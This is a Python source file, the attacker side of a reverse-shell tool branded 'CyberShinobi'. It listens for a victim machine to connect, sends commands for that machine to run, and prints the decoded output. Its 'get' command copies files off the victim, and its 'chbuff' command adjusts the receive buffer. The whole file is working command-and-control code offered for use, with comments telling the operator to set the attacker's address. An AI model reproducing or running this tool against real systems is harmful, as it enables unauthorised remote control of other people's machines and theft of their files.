# attacker script

"""
There are 2 custom commands in this script

1. The get command:
If you want to transfer any file from the victim machine you can use the get command.
just write the get and the file name or full path without quotation
SYNTAX: get <FILE_NAME or PATH>

2. The chbuff command:
if you want modify the receiving buffer in the run time you can do that by using chbuff command.
just write chbuff and the buffer size in bytes by default it is set to 1048576 bytes or 1 mb
SYNTAX: chbuff <BUFFER_SIZE in bytes>
"""

import os
import socket
import base64


def main(host: str, port: int) -> None:
	def recv_all(sock: socket.socket, buff: int) -> bytes:
		# initializing blank byte string
		full_msg = b""
		while True:
			# concatinating all byte strings
			msg = sock.recv(buff)
			full_msg += msg
			
			# if the last 5 characters are <END> then break the loop
			# it means all the data has been recevied
			if full_msg[-5:] == b"<END>":
				break
		
		# return all the data except <END>
		return full_msg[:-5]

	def get_file(cmd: str, op: bytes) -> None:
		# defining known error messages
		ERROR_MSG = [
			b"Invalid command !!!",
			b"Invalid File Name or Path !!!",
			b"Not a File !!!"
		]
		
		# if the output is any of the known error messages then print the error message and return
		if op in ERROR_MSG:
			print(op.decode())
			return
		
		# extracting only the file name from the path
		file_name = os.path.basename(cmd[4:])
		# writing the output in the the file
		with open(file_name, "wb") as file:
			file.write(op)
		
		print(file_name, "saved.")

	def chg_buff(cmd: str) -> None:
		# if chbuff command contains only a space or non integer character then return
		if len(cmd) <= 7 or not cmd[7:].isdigit():
			print("Invalid Command !!!")
			return
		
		# declaring a global variable with the same name buffer
		global buffer
		# changing the buffer
		buffer = int(cmd[7:])
		print(f"Buffer changed to {buffer} bytes.")


	# creating attacker socket
	attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# binding the host and port to the socket we created.
	attacker.bind((host, port))
	# listening for connection
	attacker.listen()

	print("Listening on", port)

	# accepting connection and receving the victim socket and socket address
	victim, sock_addr = attacker.accept()

	print("Connected to", sock_addr)


	while True:
		# input the command from the user
		command = input("CyberShinobi> ")

		# if the command is blank skip the iteration
		if not command:
			continue
		
		# if command is chbuff change the buffer
		elif command.startswith("chbuff "):
			chg_buff(command)
			continue
		
		# encoding the command and sending to the victim machine
		victim.send(command.encode())

		# If the command is exit, close the connection
		if command == "exit":
			break
		
		# receving all the data and decoding from base64 encoding
		output = base64.b64decode(recv_all(victim, buffer))
		
		# if the command is get with a file name save the file
		if command.startswith("get "):
			get_file(command, output)
			continue
		
		# deconding the actual output and printing it
		print(output.decode())

	# closing victim and attacker sockets
	victim.close()
	attacker.close()


# driver code
if __name__ == "__main__":
	# ip or domain name of the attacker machine
	host = "127.0.0.1" # change this
	# listening port of the attacker machine
	port = 6969 # change this (optional)
	
	# receving buffer (by default set to 1048576 bytes or 1 mb)
	buffer = 1048576
	
	# calling the main function
	main(host, port)
